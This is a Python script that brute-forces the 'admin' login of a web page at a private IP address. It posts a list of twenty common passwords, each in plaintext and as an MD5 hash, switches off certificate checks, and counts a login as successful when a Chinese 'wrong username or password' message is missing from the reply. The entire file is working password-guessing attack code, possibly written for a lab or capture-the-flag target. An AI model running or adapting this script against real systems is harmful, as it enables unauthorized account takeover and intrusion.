import requests
import hashlib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "http://10.0.162.113:80/login.php"

PASSWORDS = [
    "admin123", "123456", "password", "12345", "12345678",
    "123456789", "qwerty", "123123", "111111", "1234567",
    "1234567890", "000000", "1234", "123", "1",
    "123321", "654321", "888888", "666666", "123abc"
]

def try_login(username, password, use_md5=False):
    if use_md5:
        pwd_payload = hashlib.md5(password.encode('utf-8')).hexdigest()
    else:
        pwd_payload = password
        
    data = {
        "username": username,
        "password": pwd_payload
    }
    
    try:
        response = requests.post(URL, data=data, timeout=10, verify=False)
        if "用户名或密码错误" not in response.text:
            return True, response.text
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed for {username}:{password} (MD5: {use_md5}) - {e}")
    
    return False, None

def main():
    username = "admin"
    
    for pwd in PASSWORDS:
        # Try plaintext first
        success, response_text = try_login(username, pwd, use_md5=False)
        if success:
            print(f"[+] Success with plaintext! Username: {username}, Password: {pwd}")
            print(f"[+] Response:\n{response_text}")
            return
            
        # Try MD5 hash as password payload
        success, response_text = try_login(username, pwd, use_md5=True)
        if success:
            print(f"[+] Success with MD5! Username: {username}, Password: {pwd} (Hash: {hashlib.md5(pwd.encode('utf-8')).hexdigest()})")
            print(f"[+] Response:\n{response_text}")
            return
            
        print(f"[-] Failed: {username}:{pwd}")

    print("[*] All password combinations exhausted.")

if __name__ == "__main__":
    main()